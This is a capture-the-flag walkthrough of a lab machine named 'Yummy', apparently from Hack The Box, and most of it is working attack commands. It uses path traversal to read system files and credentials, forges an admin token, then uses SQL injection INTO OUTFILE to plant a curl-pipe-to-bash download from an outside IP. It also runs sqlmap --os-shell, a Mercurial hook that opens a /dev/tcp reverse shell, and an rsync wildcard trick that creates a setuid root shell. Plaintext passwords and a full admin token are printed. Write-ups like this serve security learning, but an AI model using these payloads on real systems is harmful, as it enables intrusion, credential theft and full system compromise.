1,Recon
port scan
	22/tcp ssh
	80/tcp http `Caddy httpd`
From the top-bar of the index page, we can find the login page, register page and dashboard page.And when we make a test account and check the dashboard, there is nothing there.

![](images/Pasted%20image%2020241026090000.png)
We can use handle the download link `http://yummy.htb/reminder/21` by using burpsuite.

![](images/Pasted%20image%2020241026090344.png)
![](images/Pasted%20image%2020241026090358.png)
We find there is a call for `GET /export/Yummy_reservation_20241026_130347.ics HTTP/1.1`
that would be a `Path traversal` vulner.
the payload would 
`GET /export/../../../../../../etc/passwd HTTP/1.1`

```
dev:x:1000:1000:dev:/home/dev:/bin/bash
mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
caddy:x:999:988:Caddy web server:/var/lib/caddy:/usr/sbin/nologin
postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
qa:x:1001:1001::/home/qa:/bin/bash
```

So I would want to check id_rsa of user `qa` , the payload would be
`GET /export/../../../../../../home/qa/.ssh/id_rsa HTTP/1.1`
But # Not Found there.

`GET /export/../../../../../../etc/caddy/Caddyfile HTTP/1.1`

```
:80 {
    @ip {
        header_regexp Host ^(\d{1,3}\.){3}\d{1,3}$
    }
    redir @ip http://yummy.htb{uri}
    reverse_proxy 127.0.0.1:3000 {
    header_down -Server  
    }
}
```

`GET /export/../../../../../../etc/crontab HTTP/1.1`

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh

```

`GET /export/../../../../../../data/scripts/app_backup.sh`

```
#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app

```

So we need to continue fuzz and enumerate the valid file path
`GET /export/../../../../../../var/www/backupapp.zip HTTP/1.1`

```
/opt/app/app.py
db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db',
    'cursorclass': pymysql.cursors.DictCursor,
    'client_flag': CLIENT.MULTI_STATEMENTS

}
```

And also from app.py, we can find something interesting
```
@app.route('/admindashboard', methods=['GET', 'POST'])
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))
```

There is a hidden manager page.

But we need the admin token to check the hidden manage page.
There is `signature.py` and `verification.py` in the backup, so we can make a admin token to get the admin manage page.

Then we finally get into `/admindashboard`
![](images/Pasted%20image%2020241026104014.png)
It seems like a query about users of database, so I would check sql-injection.

Here is a qick method to have a rev shell wiith mysql priv (admin X-AUTH-Token is required)
```
http://yummy.htb/admindashboard?s=aa&o=ASC%3b++select+"ping%3b"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b

http://yummy.htb/admindashboard?s=aa&o=ASC%3b++select+"curl+10.10.16.17:80/shell.sh+|/bin/bash%3b"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b 
```

```
curl "http://yummy.htb/admindashboard?s=aa&o=ASC%3b++select+"ping%3b"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b" -H "Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQHl1bW15Lmh0YiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzMwMDAzNzQwLCJleHAiOjE3MzAwMDczNDAsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiNjI1OTQ1OTk3NjEwMTUzODQ1NjUyODA0OTg0MDMzNTY5MjY0NjYyMDc0MDI4MTA5NTAyNzA1NjI5MDcwMzIyNjk1NjI1MTU0MTA1ODgxNzg0NjU4MTkwNzMyNTE2NTMyODMyMDU0MDYxMzI4MTAyMjM2MzQ3NzE2OTA3NTE5OTQ2NTU4MzE2MjUxMDA5MzkxMzQxOTExMzk1MzY4MDE5ODAwMjkzNTQzMDU4OTM3NzE3NjI2MjYyOTMwNjU5NTUwNzA4Mjk3NzcwODAxMjE1MzMwMjE1MTI3NzkwNDczODc2MTQyNDAxNDI1MDU3MjkyNTY4MDg1MjA0Njk4NDE5NjAzOTk1MzgwNDEzNjI5MTM0OTk2ODMyMzM0MzI4MDA4NTg1Mzk0OTQ5MTM5NDc4NTQxODUxNDgwOTMiLCJlIjo2NTUzN319.AjuVnVOzEd55DHQXLT0ely14eKiLJNStav2KhP8B3GdAJzo16x3qahIk_4Kk9PCoQ_TBj1ZbCV9NSVty-mcZB_2iC2LimvgBk8m5I7lOE8U-ZhlGrI1q9Ga_ruphduC0OtfHrmTRQurcgTY4SkAyZVLVeKRhjWLUxhWY1ax0OABNcdQ"
```

Or we can use `sqlmap` to help us get the shell of `data` (admin X-AUTH-Token is required)

```
sqlmap -u "http://yummy.htb/admindashboard?s=aa&o=ASC" --cookie="X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQHl1bW15Lmh0YiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzMwMDAzNzQwLCJleHAiOjE3MzAwMDczNDAsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiNjI1OTQ1OTk3NjEwMTUzODQ1NjUyODA0OTg0MDMzNTY5MjY0NjYyMDc0MDI4MTA5NTAyNzA1NjI5MDcwMzIyNjk1NjI1MTU0MTA1ODgxNzg0NjU4MTkwNzMyNTE2NTMyODMyMDU0MDYxMzI4MTAyMjM2MzQ3NzE2OTA3NTE5OTQ2NTU4MzE2MjUxMDA5MzkxMzQxOTExMzk1MzY4MDE5ODAwMjkzNTQzMDU4OTM3NzE3NjI2MjYyOTMwNjU5NTUwNzA4Mjk3NzcwODAxMjE1MzMwMjE1MTI3NzkwNDczODc2MTQyNDAxNDI1MDU3MjkyNTY4MDg1MjA0Njk4NDE5NjAzOTk1MzgwNDEzNjI5MTM0OTk2ODMyMzM0MzI4MDA4NTg1Mzk0OTQ5MTM5NDc4NTQxODUxNDgwOTMiLCJlIjo2NTUzN319.AjuVnVOzEd55DHQXLT0ely14eKiLJNStav2KhP8B3GdAJzo16x3qahIk_4Kk9PCoQ_TBj1ZbCV9NSVty-mcZB_2iC2LimvgBk8m5I7lOE8U-ZhlGrI1q9Ga_ruphduC0OtfHrmTRQurcgTY4SkAyZVLVeKRhjWLUxhWY1ax0OABNcdQ" --data="s=aa&o=ASC" --level=5 --risk=3 --batch


sqlmap -u "http://yummy.htb/admindashboard?s=aa&o=ASC" --cookie="X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQHl1bW15Lmh0YiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzMwMDAzNzQwLCJleHAiOjE3MzAwMDczNDAsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiNjI1OTQ1OTk3NjEwMTUzODQ1NjUyODA0OTg0MDMzNTY5MjY0NjYyMDc0MDI4MTA5NTAyNzA1NjI5MDcwMzIyNjk1NjI1MTU0MTA1ODgxNzg0NjU4MTkwNzMyNTE2NTMyODMyMDU0MDYxMzI4MTAyMjM2MzQ3NzE2OTA3NTE5OTQ2NTU4MzE2MjUxMDA5MzkxMzQxOTExMzk1MzY4MDE5ODAwMjkzNTQzMDU4OTM3NzE3NjI2MjYyOTMwNjU5NTUwNzA4Mjk3NzcwODAxMjE1MzMwMjE1MTI3NzkwNDczODc2MTQyNDAxNDI1MDU3MjkyNTY4MDg1MjA0Njk4NDE5NjAzOTk1MzgwNDEzNjI5MTM0OTk2ODMyMzM0MzI4MDA4NTg1Mzk0OTQ5MTM5NDc4NTQxODUxNDgwOTMiLCJlIjo2NTUzN319.AjuVnVOzEd55DHQXLT0ely14eKiLJNStav2KhP8B3GdAJzo16x3qahIk_4Kk9PCoQ_TBj1ZbCV9NSVty-mcZB_2iC2LimvgBk8m5I7lOE8U-ZhlGrI1q9Ga_ruphduC0OtfHrmTRQurcgTY4SkAyZVLVeKRhjWLUxhWY1ax0OABNcdQ" -p "o" --level=5 --risk=3 --batch --os-shell


sqlmap -u "http://yummy.htb/admindashboard?s=aa&o=ASC" --cookie="X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQHl1bW15Lmh0YiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzMwMDAzNzQwLCJleHAiOjE3MzAwMDczNDAsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiNjI1OTQ1OTk3NjEwMTUzODQ1NjUyODA0OTg0MDMzNTY5MjY0NjYyMDc0MDI4MTA5NTAyNzA1NjI5MDcwMzIyNjk1NjI1MTU0MTA1ODgxNzg0NjU4MTkwNzMyNTE2NTMyODMyMDU0MDYxMzI4MTAyMjM2MzQ3NzE2OTA3NTE5OTQ2NTU4MzE2MjUxMDA5MzkxMzQxOTExMzk1MzY4MDE5ODAwMjkzNTQzMDU4OTM3NzE3NjI2MjYyOTMwNjU5NTUwNzA4Mjk3NzcwODAxMjE1MzMwMjE1MTI3NzkwNDczODc2MTQyNDAxNDI1MDU3MjkyNTY4MDg1MjA0Njk4NDE5NjAzOTk1MzgwNDEzNjI5MTM0OTk2ODMyMzM0MzI4MDA4NTg1Mzk0OTQ5MTM5NDc4NTQxODUxNDgwOTMiLCJlIjo2NTUzN319.AjuVnVOzEd55DHQXLT0ely14eKiLJNStav2KhP8B3GdAJzo16x3qahIk_4Kk9PCoQ_TBj1ZbCV9NSVty-mcZB_2iC2LimvgBk8m5I7lOE8U-ZhlGrI1q9Ga_ruphduC0OtfHrmTRQurcgTY4SkAyZVLVeKRhjWLUxhWY1ax0OABNcdQ" -p "o" --level=5 --risk=3 --batch --file-write=/opt/payloads/shell.sh --file-dest=/data/scripts/fixer-v___

```

Then we can get the shell of data.

Then we can switch to `www-data` to check `/var/www/app-qatesting/.hg/store/data/app.py.i
Firstly, we need to check the database and find something for user `qa`.
```
username : chef
password  : 3wDo7gSRZIwIHRxZ!
```


```
username : qa
password  : jPAd!XQCtn8Oc@2B
```
And we find the credit so that we can ssh to login into shell of `qa`

2, shell as root
Firstly, check `sudo -l`
```
Matching Defaults entries for qa on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User qa may run the following commands on localhost:
    (dev : dev) /usr/bin/hg pull /home/dev/app-production/
```

In this place, it mentions `dev:dev`, so we need to check who is in the group of `dev`

We can check the process and netstate there
```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:2019          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -      
```

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
qa          8535  0.0  0.1   8516  5376 pts/0    Ss   15:02   0:00 -bash
qa          8725  0.0  0.1  12184  5248 pts/0    R+   15:06   0:00 ps -aux
```

But there is nothing useful for us.

Let's come to `hg pull as user dev`

```
cd /tmp;
mkdir .hg; 
chmod 777 .hg; 
cp ~/.hgrc .hg/hgrc
Add the reverse shell script at the last line in /tmp/.hg/hgrc:
Put this line inside the /tmp/.hg/hgrc file using nano 

[hooks]
post-pull = /tmp/revshell.sh

Then Create a file revshell.sh inside the /tmp folder

nano revshell.sh
#!/bin/bash
/bin/bash -i >/dev/tcp/10.10.x.x./4444 0<&1 2>&1

Then give execute permissions --
chmod +x /tmp/revshell.sh

Don't forget to start the Netcat listener on port 4444
nc -lvnp 4444

go back to the ssh shell --
sudo -u dev /usr/bin/hg pull /home/dev/app-production/
enter the password for the user qa

This will give you a reverse shell on port 4444

```

Continue to check user `dev` can do anything as root
```
Matching Defaults entries for dev on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dev may run the following commands on localhost:
    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/
```

When the symbol `*` appear, that means we can make some tricky exploit here.

Firstly, we can copy the bash into this file path
```
cp /bin/bash app-production/bash
chmod u+s app-production/bash
```

Then we use the root privilege to run the command 
`sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/`

Finally, we can run this bash as root
`/opt/app/bash -p`
`whoami root`

